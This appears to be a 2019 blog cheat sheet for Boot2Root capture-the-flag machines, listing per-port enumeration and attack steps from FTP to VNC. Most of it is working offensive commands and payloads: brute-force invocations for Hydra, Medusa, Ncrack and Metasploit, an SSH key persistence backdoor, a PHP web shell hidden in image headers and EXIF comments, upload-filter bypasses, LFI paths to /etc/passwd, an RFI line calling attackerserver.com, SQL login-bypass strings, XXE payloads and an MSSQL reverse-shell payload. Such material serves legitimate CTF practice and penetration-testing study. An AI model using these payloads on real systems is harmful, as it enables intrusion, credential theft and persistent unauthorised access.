---
title: " Note: Boot2Root Enumeration based on Ports"
date: "2019-07-20"
layout: single
tags:
- Boot2root
categories:
- Notes
---

Hey everyone.

When we're playing Boot2root concept CTF, after we scanned the target machine using Nmap scanner, Nmap will display what ports are open on that box. So, I made this note to guide me how to enumerate the machine based on the open ports on a specific machine.

So, I think it is good to share this note to the beginner to start playing around with Boot2Root CTF stuff. 

Have fun and Goodluck!
# Contents

 1. [21-FTP](#21-ftp)
 2. [22-SSH](#22-ssh)
 3. [23-Telnet](#23-telnet)
 4. [25-SMTP](#25-smtp)
 5. [53-DNS](#53-dns) 
 6. [69-TFTP](#59-tftp) 
 7. [79-Finger](#79-finger) 
 8. [80,443-HTTP,HTTPS](#80,443-http,https)
 9. [88-Kerberos](#88-kerberos)
 10. [110-POP3](#110-pop3)
 11. [135-MSRPC](#135-msrpc)
 12. [139,445-SMB,Samba,Netbios](#139,445-smb,samba,netbios)
 13. [161,162-SNMP](#161,162-snmp)
 14. [389,636-LDAP](#389,636-ldap)
 15. [1433-MsSQL](#1433-mssql) 
 16. [1521-Oracle ](#1521-oracle) 
 17. [2049-NFS](#2049-nfs) 
 18. [3306-MySQL](#3306-mysql) 
 19. [3389-RDP](#3389-rdp) 
 20. [5900-VNC](#5900-vnc) 



# 21-FTP
**Enumeration**
-   Connect to the ftp-server and enumerate software and version
-  Sometimes clues are put here.
-   Downloads everything
	-   `mget *`
-   Enumeration all-in-one
	-   `nmap –script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 IP`
-   Old version of ftp might be vulnerable
	-   Look at the version 
	-   Search the exploit using Google / Searchsploit / Rapid7
-   Use ncftp
	-   `ncftp <ip address>`  
	-   `ftp <ip address>`
	    

-   Many ftp-servers allow anonymous users.
	-   `anonymous:anonymous`
    

-   Remember the binary and ascii mode! 
	-   `binary` = Switches to binary transfer mode.
	-   `ascii` = Switch to ASCII transfer mode.
    

-   FTP command
	-   `send` = Send single file
	-   `put` = Send one file.
	-   `mput` = Send multiple files.
	-   `mget` = Get multiple files.
	-   `get` = Get file from the remote computer.
	-   `ls` = list
    

-   Examine configuration files
	-   ftpusers
	-   ftp.conf
	-   proftpd.conf
    

-   If you find some credential, try it on SSH / Login page / database
	-   Google for exploit
	-   Rapid7

-   Some of top exploit
	-   ProFTPD-1.3.3c Backdoor
	-   ProFTPD 1.3.5 Mod_Copy Command Execution   
	-   VSFTPD v2.3.4 Backdoor Command Execution
-   SearchSploit

**Brute-force FTP credential**

-   Hydra
	-   `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V`
  
---

# 22-SSH

**Enumeration**
-   SSH banner grabbing
-   `nmap -sV [ip address]`
-   Google for exploit
	-   Rapid7
	-   SearchSploit
-   Vulnerable Versions: 7.2p1

**Make connection**
-   Connect to SSH
	-   `ssh username@ipaddress`
-   Connect to SSH with private key
	-   `ssh –i key username@ip address`

**Brute-force Attack on SSH**
-   Metasploit
	-   `use auxiliary/scanner/ssh/ssh_login` 
	-   `msf auxiliary(ssh_login) > set rhosts 192.168.1.17`
	-   `msf auxiliary(ssh_login) > set rport 22`
	-   `msf auxiliary(ssh_login) > set userpass_file [path of file]`
	-   `msf exploit (ssh_login)]set pass_file [path of file]`
-   Patator
	-  `patator ssh_login host=192.168.1.103 user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt`
-   Hydra
	-   `hydra -L /root/Downloads/pwntilldawn/Wordlist.txt -P /root/Downloads/pwntilldawn/Wordlist.txt 192.168.1.103 ssh`
    -   `-L` for a username list
    -   `-P` for the password list
-   Medusa
	-   `medusa -h 192.168.3.189 -U /root/Downloads/pwntilldawn/Wordlist.txt -P /root/Downloads/pwntilldawn/Wordlist.txtt -M ssh`
-   Ncrack   
	-   `ncrack –v –U /root/Downloads/pwntilldawn/Wordlist.txt –P /root/Downloads/pwntilldawn/Wordlist.txt 192.168.3.189:22`
-   Nmap
	-   `nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s`
  

**Enumeration for Exploit**

-   Stealing authorized keys (post exploit after logged in)
	-   `use post/multi/gather/ssh_creds`
	-   `msf post(ssh_creds) > set session 1`
	-   `msf post(ssh_creds) > exploit`
    

-   Create permanent backdoor
	-   This module will add an SSH key to a specified user, allow remote login via SSH at any time.
	-   `use post/linux/manage/sshkey_persistence`   
	-   `msf post(sshkey_persistence) > set session 1`   
	-   `msf post(sshkey_persistence) > exploit`
    

-   SSH Port Forwarding
	-   `ssh -L 9999:10.0.2.2:445 user@192.168.2.250`
	-   Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250

-   Path of id_rsa
	-   user home `name/.ssh/id_rsa`
	-   user home `name/.ssh/authorized key`
    

-   Crack id_rsa
	-   `/usr/share/john/ssh2john.py`

-   Examine configuration files
	-   ssh_config
	-   sshd_config
	-   authorized_keys
	-   ssh_known_hosts
	-   .shosts

---

# 23-Telnet


**Enumeration**
-   SMTP Banner grabbing through telnet
	-   `telnet <ip address> 25` 
-   guess for valid user account
	-   `vrfy admin@mail.com`
	-   If you received a message code `250,251,252` which means user account is valid.

-   Nmap enumeration
	-   `nmap -p 23 --script=telnet-ntlm-info.nse`
-   Telnet Banner Grabbing through Metasploit
	-   `use auxiliary/scanner/telnet/telnet_version`
	-   `msf auxiliary(telnet_version) > set rhosts 192.168.0.106`
	-   `msf auxiliary(telnet_version) > set rport 23`
	-   `msf auxiliary(telnet_version) > set threads 5`
	-   `msf auxiliary(telnet_version) > exploit`
    

-   Google for exploit
	-   Rapid7
	-   SearchSploit
    
-   Examine configuration files
	-   `/etc/inetd.conf`
	-   `/etc/xinetd.d/telnet`
	-   `/etc/xinetd.d/stelnet`
  

**Brute-Force Attack**

- Brute Force Attack using metasploit
	-   `use auxiliary/scanner/telnet/telnet_login`
	-   `msf auxiliary(telnet_login) > set rhosts 192.168.0.106`
	-   `msf auxiliary(telnet_login) > set user_file /root/Desktop/user.txt`
	-   `msf auxiliary(telnet_login) > set pass_file /root/Desktop/pass.txt`
	-   `msf auxiliary(telnet_login) > set stop_on_success true`
	-   `msf auxiliary(telnet_login) > exploit`
	    

- Brute force using Hydra
	- `hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt [ip address] telnet`

---

# 25-SMTP

**Enumeration**
-   Enumeration SMTP user
	-   `smtp-user-enum -M VRFY -U names.txt -t ipadress`
		-   Where `-M` for mode.
		-   `-U` for userlist.
		-   `-t` for target
-   Enumeration all in one
	-   `nmap –script=smtp-ntlm-fin,smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [target ip]`
    

-   Enumerating Email Addresses Instead of Usernames
	-   `./smtp-user-enum -D example.com -M RCPT -U users.txt -t 10.0.0.1\`
    

-   Enumerating SMTP Users using Telnet
	-   `telnet ipaddress 25`
	-   `VRFY [username]` = (verifies if username exists - enumeration of accounts)
	-   `EXPN [username]` = (verifies if username is valid - enumeration of accounts)
    

-   Google for exploit
	-   Rapid7
	-   SearchSploit
    
-   Examine Configuration Files
	-   sendmail.cf
	-   submit.cf	
    

  

**Brute-Force Attack**
-   Bruteforce using Hydra
	-   `hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V`

---

# 53-DNS 
-   Fingerprint
	-   `host`
	-   `nslookup`
	-   `dig`
	-   `whois`

---

# 69-TFTP 

**Nmap enumeration**
-   `nmap -p69 --script=tftp-enum.nse`

**Vulnerability**

-   vuln tftp server 1.3, 1.4, 1.9, 2.1, and a few more

**Bruteforce directory / files**

-   Using tftpbrute
	-   `use auxiliary/scanner/tftp/tftpbrute`
---

# 79-Finger 

-   User enumeration
	-   `finger 'a b c d e f g h' @example.com`
	    
	-   `finger admin@example.com`
	    
	-   `finger user@example.com`
	    
	-   `finger 0@example.com`
	    
	-   `finger .@example.com`
	    
	-   `finger **@example.com`
	    
	-   `finger test@example.com`
	    
	-   `finger @example.com`
    

-   Command execution

	-   `finger "|/bin/id@example.com"`
	    
	-   `finger "|/bin/ls -a /@example.com"`
    

-   Finger Bounce
	-   `finger user@host@victim`
	    
	-   `finger @internal@external`

---

# 80,443-HTTP,HTTPS



**Enumeration**

-   Add ip address into etc/host (DNS)
	-   Check it out web browser
	-   What does it display
	-   Read entire pages
		-   look for emails, names, user info	-   Enum the interface, what version of CMS, server installation page etc.	-   What does the potential vulnerability in it?
		-   LFI, RFI, Directory traversal, SQL Injection, XML External Entities, OS Command Injection, Upload vulnerability

	-   Default web server page which reveals version information?

-   Use Web Application Scanner (Refer note)
	-   Example, nikto
		-   `nikto -h 10.10.10.10 –output filename`

-   Google for exploit
	-   Rapid7
	-   SearchSploit

-   If https
	-   scan for heartbleed
		-   `sslscan 192.168.101.1:443`
		-   `nmap -sV --script=ssl-heartbleed 192.168.3.157`
	-   Read the certificate
		-   Does it include names that might be useful?	-   Correct vhost

-   View the source code
	-   Hidden Values
	-   Developer Remarks
	-   Extraneous Code
	-   Passwords!

-   Use curl
	-   `curl <ip address / dns>`   
-   View robots.txt-   Brute forcing HTTP(s) directories and files	-   Tools
		-   dirb
		-   dirbuster
		-   nikto
		-   wfuzz
		-   gobuster for quick directory search

-   Brute force directory recursively
	-   If you found a directory example /admin, bruteforce more deeply
	-   `dirb http://10.10.10.1/admin/`
-   Looking for .git
-   Set extension
	    -   sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
-   Bruteforce subdomain
    -   [xxx.google.com](http://xxx.google.com/)

-   Creating wordlist from webpage
	-   cewl

-   Redirecting webpage automatically?
	-   noredirect plugin
-   If it's a login page
	-   Try view source code
	-   Use default password
	-   Brute force directory first (sometime you don't need to login to pwn the machine)
	-   using curl
	-   bruteforce credential
		-   Burpsuite		
			-   sniper. clusterbomb  
		-   Wfuzz		
			- `wfuzz -w pass.txt -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 http://login page path`	
		- Search credential in other service port
			-   tftp
			-   ftp
	-   Enumeration for the credential
	-   Search credential by bruteforce directory
	-   Register first
	-   SQL injection
		-   `SQLMap`
	-   XSS can be used to get the admin cookie
	-   Bruteforce session cookie

-   If it's a CMS
	-   Google their vulnerability	
		- Wordpress, Drupal, Joomla. Vtiger, etc.   
	-   Go to admin page
		   -   Joomla
			    -   /administrator
		    -   Wordpress
			    -   /wp-admin
			    -   /wp-login
	-   Wordpress
	    -   `wpscan -u 192.168.3.145 --enumerate -t --enumerate u --enumerate p`
	    -   Bruteforce login page			
		    -   `wpscan –u ipaddress --username name --wordlist pathtolist`
		-   Random agent
	    -   `wpscan -u http://cybear32c.lab/ --random-agent`
		-   `Zoom.py`
			-   enumerate wordpress users
	- Drupal	
		- `droopsescan https://github.com/droope/droopescan`
		-   `/CHANGELOG.txt` to find version

	-   Adobe Cold Fusion
		-   Metasploit	-   Determine version
		-   /CFIDE/adminapi/base.cfc?wsdl
		-   Version 8 Vulnerabilit
		-   Fckeditor
		-   use exploit/windows/http/coldfusion_fckeditor
		-   LFI
		    -   `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

	-   Elastix
		-   Google the vulnerabitlities
		-   default login are admin:admin at [/vtigercrm/](http://example.com/vtigercrm/)
		-   able to upload shell in profile-photo
		-   Examine configuration files	-   Generic
		-   Examine `httpd.conf`/ windows config files

	-   JBoss
		-   JMX Console `http://IP:8080/jmxconcole/`
		-   War File
	-   Joomla	
		-   configuration.php
		-   diagnostics.php
		-   joomla.inc.php
		-   config.inc.php

	-   Mambo
		-   configuration.php	
		- config.inc.php
	-   Wordpress	
		- setup-config.php	
		- wp-config.php
	-   ZyXel
		-   /WAN.html (contains PPPoE ISP password)
		-   /WLAN_General.html and /WLAN.html (contains WEP key)
		-   /rpDyDNS.html (contains DDNS credentials
		-   /Firewall_DefPolicy.html (Firewall)
		-   /CF_Keyword.html (Content Filter)
		-   /RemMagWWW.html (Remote MGMT)
		-   /rpSysAdmin.html (System)
		-   /LAN_IP.html (LAN)
		-   /NAT_General.html (NAT)
		-   /ViewLog.html (Logs)
		-   /rpFWUpload.html (Tools
		-   /DiagGeneral.html (Diagnostic)
		-   /RemMagSNMP.html (SNMP Passwords)
		-   /LAN_ClientList.html (Current DHCP Leases)
		-   Config Backups
			-   /RestoreCfg.html
			-   /BackupCfg.html

-   Upload page
	-   Upload shell to make reverse shell
	-   Bypass file upload filtering
	-   Rename it
		-   upload it as shell.php.jpg
	-   Blacklisting bypass, change extension
		-   php phtml, .php, .php3, .php4, .php5, and .inc
		-   bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6
		-   asp asp, .aspx
		-   perl .pl, .pm, .cgi, .lib
		-   jsp .jsp, .jspx, .jsw, .jsv, and .jspf
		-   Coldfusion .cfm, .cfml, .cfc, .dbm
-  Whitelisting bypass
	-   passed by uploading a file with some type of tricks,
	-   Like adding a null byte injection like ( `shell.php%00.gif` ).
	-   Or by using double extensions for the uploaded file like ( shell.jpg.php)
	-   GIF89a;
	-   If they check the content. Basically you just add the text "GIF89a;" before you shell-code.
		``<? system($_GET['cmd']);//or you can insert your complete shellcode ?>``
	-   In image
		-   manipulate data
		-   `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`
		-   rename it			
			-  `mv lo.jpg lo.php.jpg`

-   Phpmyadmin
	-   Default password `root:pma`
-   Webmin
    -   Have vulnerabilities, google.
-   Identify WAF using `wafw00f`   
- Spidering a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers
-   WMAP Web Scanner
    -   web application vulnerability scanner

**Exploitation**
-   Heartbleed exploit
    
        use auxiliary/scanner/ssl/openssl_heartbleed
        set RHOSTS 192.168.3.212
        set verbose true
        run

-   XXS
	-   Session hijacking / Cookie theft. Steal cookie to get admin privilege
	-   use xsser tool
-   Local File Inclusion
	-   Bypassing php-execution
		-   `http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index`
	-   Bypassing the added .php and other extra file-endings
		-   `` http://example.com/page=../../../../../../etc/passwd%00 ``
		-   `` http://example.com/page=../../../../../../etc/passwd? ``
	-   folder that always exist
		-   `/etc/hosts /etc/resolv.conf`
	-   add %00jpg to end of files
		-   `/etc/passwd%00jpg`
	-   Refer this for more information
		-   [https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html](https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html)
		-   [https://highon.coffee/blog/lfi-cheat-sheet/](https://highon.coffee/blog/lfi-cheat-sheet/)

-   Remote file inclusion
    -   http://exampe.com/index.php?page=http://attackerserver.com/evil.txt

-   SQL Injection
	-   Enum using nmap
		-   `nmap -sV --script=http-sql-injection <target>`
	-   Using jsql
	-   Using sqlmap with login-page
	-   Capture the request using burp suite, and save the request in a file.
	-   sqlmap -r request.txt
	-   Crawl a page to find sql-injections
		-   `sqlmap -u http://example.com --crawl=1`
	-   [http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

	-   Login bypass
		-   ‘or 1=1- -
		-   ‘ or ‘1’=1
		-   ‘ or ‘1’=1 - -
		-   ‘–
		-   ' or '1'='1
		-   -'
		-   ' '
		-   '&'
		-   '^'
		-   '*'
		-   ' or ''-'
		-   ' or '' '
		-   ' or ''&'
		-   ' or ''^'
		-   ' or ''*'
		-   "-"
		-   " "
		-   "&"
		-   "^"
		-   "*"
		-   " or ""-"
		-   " or "" "
		-   " or ""&"
		-   " or ""^"
		-   " or ""*"
		-   or true--
		-   " or true--
		-   ' or true--
		-   ") or true--
		-   ') or true--
		-   ' or 'x'='x
		-   ') or ('x')=('x
		-   ')) or (('x'))=(('x
		-   " or "x"="x
		-   ") or ("x")=("x
		-   ")) or (("x"))=(("x
		-   known Username
			-   admin’ - -
			-   admin’) - -

	-   Using error-bases DB enumeration
		-   Add the tick '
		-   Enumerate columns

	-   Using order by
		-   [https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html](https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html)

-   XML External Entity (XXE)

            <?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
    or 
   

	    <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "expect://id" >]> 


-   URL vulnerability
-   OS command Injection
-   Directory traversal
-   Dotdotpwn tool


# 88-Kerberos
**Enumeration**
-   Google for exploit
-   Rapid7
-   SearchSploit

**Exploitation**
-   MS14-068 Microsoft Kerberos Checksum Validation Vulnerability
	-   `use auxiliary/admin/kerberos/ms14_068_kerberos_checksum`

---

# 110-POP3


**Connect to pop3**

 - `telnet 10.10.10.51 110`     
 - User: username   
 - Pass: password     
 - `LIST` 
	 - lists all the messages in John’s account

**Enumeration**
-   Google for exploit
-   Rapid7    
-   SearchSploit

---

# 135-MSRPC


**Enumeration**
-   `nmap -n -v -sV -Pn 192.168.0.101 --script=msrpc-enum`    
-   RPC bind  
	-   `rcpclient -U “” IP`
	-   `rpcinfo -p IP`
-   Google for exploit
	-   Rapid7    
	-   SearchSploit     

**Exploitation**
-   MS03-026 Microsoft RPC DCOM Interface Overflow
-   This module exploits a stack buffer overflow in the RPCSS service    
	-   `msf > use exploit/windows/dcerpc/ms03_026_dcom`

---

# 161,162-SNMP

**Function**
-   SNMP is used to manage devices on a network.
 

**Enumeration**
 -   Using Nmap
		-   `nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP`
 -   SNMPwalk
		-   walks through the whole database tree and outputs the content.
		-   `snmpwalk -c public/private -v1 192.168.1.101`
 -   snmp-check
		-   `snmp-check -t 192.168.1.101 -c public`
 -   Scan for open ports
		-   `nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt`
 -   Using metasploit module
		-   `msf > search snmp`
		-   This will display the modules
			-   `use auxiliary/scanner/snmp/snmp_enum`
		-   gather lots of information when using SNMP scanning modules such as open ports, services, hostname, processes, and uptime to name a few.
			 - `auxiliary/scanner/snmp/snmp_enum`
			 - `auxiliary/scanner/snmp/snmp_enum_hp_laserjet`
			 - `auxiliary/scanner/snmp/snmp_enumshares`
			 - `auxiliary/scanner/snmp/snmp_enumusers`
			 - `auxiliary/scanner/snmp/snmp_login`
 -   Using impacket script
		-   `python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX`
 -   SNMPv3 enumeration
		-   `nmap -sV -p 161 --script=snmp-info TARGET-SUBNET`
		-   `apt-get install snmp snmp-mibs-downloader`
	-   wget [https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb](https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb)

**Wordlist**
-   `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`

**SNMP MIB Trees**
-   1.3.6.1.2.1.25.1.6.0 System Processes
-   1.3.6.1.2.1.25.4.2.1.2 Running Programs
-   1.3.6.1.2.1.25.4.2.1.4 Processes Path
-   1.3.6.1.2.1.25.2.3.1.4 Storage Units
-   1.3.6.1.2.1.25.6.3.1.2 Software Name
-   1.3.6.1.4.1.77.1.2.25 User Accounts
-   1.3.6.1.2.1.6.13.1.3 TCP Local Ports

**Exploitation**
 -   Brute-forcing of community strings
 -   nmap
		-   `nmap -sU 172.16.201.130 -p161 --script=snmp-brute -Pn --script-args snmp-brute.communitiesdb=list.txt`
 -   metasploit
	 - `auxiliary/scanner/snmp/snmp_login`
	 - `set PASS_FILE <file path>`
-   snmpbrute.py
	-   `python snmpbrute.py -t 172.16.201.130`
-   onesixtyone
	-   `onesixtyone -c dict.txt <target ip>`

---

# 389,636-LDAP


**Enumeration**
-   Sometimes can access the ldap using a anonymous login, or with other words no session.    
	-   `nmap -p 389 --script ldap-search <target ip>`   
	-   `ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"`    
-   ad-ldap-enum    
	-   discover users and their group memberships from Active Directory.    
	-   `python ad-ldap-enum.py -d contoso.com -l 10.0.0.1 -u Administrator -p P@ssw0rd`

**Exploitation**
-   Ldap Injection for web application
-   [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md)    
-   ldap-brute    
	-   `nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' <host>`

---

# 1433-MsSQL 



**Enumeration**

-   Nmap   
	- `nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password IP`

-   Metasploit. Refer this [article](https://www.hackingarticles.in/mssql-penetration-testing-metasploit/).
	-   `msf > use auxiliary/scanner/mssql/mssql_ping`
	-   Search for module
		-   `msf > search mssql`
	-   Version Scanner
		-   `use auxiliary/scanner/mysql/mysql_version`
	-   Enumerate MSSQL configuration setting
		-   admin module that will accept a set of credentials and query a MSSQL for various configuration settings.
			-   `msf > use auxiliary/admin/mssql/mssql_enum`
			-   `msf auxiliary(mssql_enum) > set rhost 192.168.1.104`
			-   `msf auxiliary(mssql_enum) >set password admin123`
			-   `msf auxiliary(mssql_enum) >run`
	-   Identifying SQL Server logins
		-   obtain a list of all logins from a SQL Server with any login.
			-   `use auxiliary/admin/mssql/mssql_enum_sql_logins`
			-   `msf auxiliary(mssql_enum_sql_logins) >set rhost 192.168.1.104`
			-   `msf auxiliary(mssql_enum_sql_logins) > set password admin123`
			-   `msf auxiliary(mssql_enum_sql_logins) > run`
	-   Identify Database owner
		-   This module can be used to escalate privileges to sysadmin if the user has the db_owner role in a trustworthy database owned by a sysadmin user.
			-   `use auxiliary/admin/mssql/mssql_escalate_dbowner`
			-   `msf auxiliary(mssql_escalate_dbowner) > set rhost 192.168.1.104`
			-   `msf auxiliary(mssql_escalate_dbowner) > set password admin123`
			-   `msf auxiliary(mssql_escalate_dbowner) >run`
	-   Identify a User With admin privilege
		-   This module can be used escalate privileges if the IMPERSONATION privilege has been assigned to the use
			-   `use auxiliary/admin/mssql/mssql_escalate_execute_as`
			-   `msf auxiliary(mssql_escalate_execute_as) > set rhost 192.168.1.104`
			-   `msf auxiliary(mssql_escalate_execute_as) > set password admin123`
			-   `msf auxiliary(mssql_escalate_execute_as) > run`
	-   Retrieve MSSQL Password Hashes of Users
		-   This module extracts the usernames and encrypted password hashes from an MSSQL server and stores them for later cracking.
			-   `use auxiliary/scanner/mssql/mssql_hashdump`
			-   `msf auxiliary(mssql_hashdump) > set rhosts 192.168.1.104`
			-   `msf auxiliary(mssql_hashdump) > set password admin123`
			-   `msf auxiliary(mssql_hashdump) > run`
	-   Cracked Password Hashes of Users
		-   This module uses John the Ripper to identify weak passwords that have been acquired from the mssql_hashdump module.
			-   `use auxiliary/analyze/jtr_mssql_fast`
			-   `msf auxiliary(jtr_mssql_fast) > run`
	-   Extracting MYSQL Schema Information
		-   This module attempts to extract the schema from an MSSQL Server Instance.
			-   `use auxiliary/scanner/mssql/mssql_schemadump`
			-   `msf auxiliary(mssql_schemadump) > set rhosts 192.168.1.104`
			-   `msf auxiliary(mssql_schemadump) > set password admin123`
			-   `msf auxiliary(mssql_schemadump) > run`
	-   Exploit xp_cmdshell vulnerability
		-   This module executes an arbitrary payload on a Microsoft SQL Server by using the “xp_cmdshell” stored procedure.
			-   `use exploit/windows/mssql/mssql_payload`
			-   `msf exploit(mssql_payload) >set rhost 192.168.1.104`
			-   `msf exploit(mssql_payload) >set password admin123`
			-   `msf exploit(mssql_payload) >set srvhost 192.168.1.115`
			-   `msf exploit(mssql_payload) >r`
  

Bruteforce login

-   Dictionary attack
	-   `use auxiliary/scanner/mssql/mssql_login`
	-   `msf auxiliary(mssql_login) > set rhosts 192.168.1.104`
	-   `msf auxiliary(mssql_login) > set user_file /root/Desktop/user.txt`
	-   `msf auxiliary(mssql_login) > set pass_file /root/Desktop/pass.txt`
	-   `msf auxiliary(mssql_login) > run`
-   Using nmap script
	-   `nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt IP`
  

Metasploit MSSQL Shell
	-   `msf > use exploit/windows/mssql/mssql_payload`
	-   `msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp`
  

  

Metasploit MSSQL payload
	-   `use exploit/windows/mssql/mssql_payload`

---
# 1521-Oracle 


**Enumeration**
-   Run nmap scripts against Oracle TNS
	-   `nmap -p 1521 -A TARGET`
	-   `nmap -n -v -sV -Pn -p 1521 –script=oracle-enum-users –script-args sid=ORCL,userdb=users.txt IP`
-   Using oscanner
	-   `oscanner -s <ip address> -P 1521`
-   Fingerprint oracle tns
	-   `tnscmd10g = A tool to prod the oracle tnslsnr process`
	-   `tnscmd10g version -h 192.168.1.101`
	-   `tnscmd10g status -h 192.168.1.101`
-   Using metasploit
	-   Oracle Database Enumeration
		-   `use auxiliary/admin/oracle/oraenum`
	-   Oracle TNS Listener SID Enumeration
		-   `use auxilary/scanner/oracle/sid_enum`

  

**Brute-Force**
-   Identify default Oracle accounts
	-   `nmap --script=oracle-sid-brute ip`
	-   `nmap -n -v -sV -Pn -p 1521 --script=oracle-brute ip`
-   Bruteforce valid SID using metasploit
	-   `msf > use auxiliary/admin/oracle/sid_brute`
	-   `msf auxiliary(admin/oracle/sid_brute) > set rhost 10.10.10.82`
	-   `msf auxiliary(admin/oracle/sid_brute) > run`
-   Bruteforce credential
	-   `msf > use auxiliary/admin/oracle/oracle_login`
	-   `msf auxiliary(admin/oracle/oracle_login) > set sid XE`
	-   `msf auxiliary(admin/oracle/oracle_login) > set rhost 10.10.10.82`
	-   `msf auxiliary(admin/oracle/oracle_login) > run`

---
# 2049-NFS 

-   Network file system This is a service used so that people can access certain parts of a remote filesystem.
-   See what the filesystem is sharing    
	-   showmount -e 192.168.1.109
-   mount the filesystem to your machine
	-   mount 192.168.1.109:/ /tmp/NFS
	-   mount -t 192.168.1.109:/ /tmp/NFS
---
# 3306-MySQL 

**Enumeration**

-   Always test root:root credential
	-   `mysql --host=192.168.1.101 -u root -p`
	-   `mysql -h 192.168.3.212 -u wpmaster@localhost -p`
	-   `mysql -h <Hostname> -u root@localhost`
	-   `mysql -h <Hostname> -u ""@localhost`
-   `telnet 192.168.0.101 3306`
-   MySQL server configuration file is my.cnf or /etc/mysql
-   Nmap enumeration
	-   `nmap -n -v -sV -Pn -p 3306 –script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-emptypassword,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 IP`
-   Finding passwords to mysql
-   You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege.
-   Look into the database and see what users and passwords that are available.
-   `/var/www/html/configuration.php`
-   Running SQL queries using MS without Login into Mysql
	-   `use auxiliary/admin/mysql/mysql_sql`
	-   `set rhosts 192.162.1.108`
	-   `set username root`
	-   `set password 123`
	-  `set sql show databases`
	-   `exploit`
-   Extract Mysql-Schemadump Information
	-   `use auxiliary/scanner/mysql/mysql_schemadump`
	-   `set rhosts 192.168.1.108`
	-   `set username root`
	-   `set password 123`
	-   `exploit`
-   Extracting Login from Mysql-server
	-   `use auxiliary/scanner/mysql/mysql_hashdump`
	-   `set rhosts 192.168.1.108`
	-   `set username root`
	-   `set password 123`
	-   `exploit`
-   Enumerate files and directories
	-   `use auxiliary/scanner/mysql/mysql_file_enum`
	-   `set rhosts 192.168.1.108`
	-   `set username root`
	-   `set password 123`
	-   `set file_list /root/dir.txt`
	-   `exploit`
-   Getting all the information from inside the database
	-   `mysqldump -u admin -p admin --all-databases --skip-lock-tables`
-   Configuration Files
	-   windows
	-   config.ini
	-   my.ini
	-   windows\my.ini
	-   winnt\my.ini
	-   [InstDir]/mysql/data/
	-   unix
	-   my.cnf
	-   /etc/my.cnf
	-   /etc/mysql/my.cnf
	-   /var/lib/mysql/my.cnf
	-   ~/.my.cnf
	-   /etc/my.cnf
	-   Command History
	-   ~/.mysql.history
	-   Log Files
	-   connections.log
	-   update.log
	-   common.log
  

  

**Brute-Force MySQL login**

-   Using Metasploit
	-  ` use auxiliary/scanner/mysql/mysql_login`
	-   `set rhosts 192.168.1.108`
	-   `set user_file /root/Desktop/user.txt`
	-   `set pass_file /root/Desktop/pass.txt`
	-   `exploit`
	  

  

**MySQL query command**

-   [https://devhints.io/mysql](https://devhints.io/mysql)



---
# 3389-RDP 

**Log in**
-   `rdesktop -u guest -p guest 10.11.1.5 -g 94%`

**Nmap**
-   `nmap -p 3389 --script=rdp-vuln-ms12-020.nse`
    

  

**Brute-force**
-   Using ncrack
	-   `ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101`
-   Using hydra
    -   `hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://192.168.0.102`


---
# 5900-VNC 

**Connect**
-   `vncviewer 192.168.1.109`
    

  

**Enumeration**
-   VNC Banner Grabbing
	-   `nmap -p 5901 --script vnc-info 192.168.1.218`
    

  

**Bruteforce password**
-   `use auxiliary/scanner/vnc/vnc_login`    
-   `msf auxiliary(vnc_login) >set rhosts 192.168.1.218`    
-   `msf auxiliary(vnc_login) >set rport 5901`   
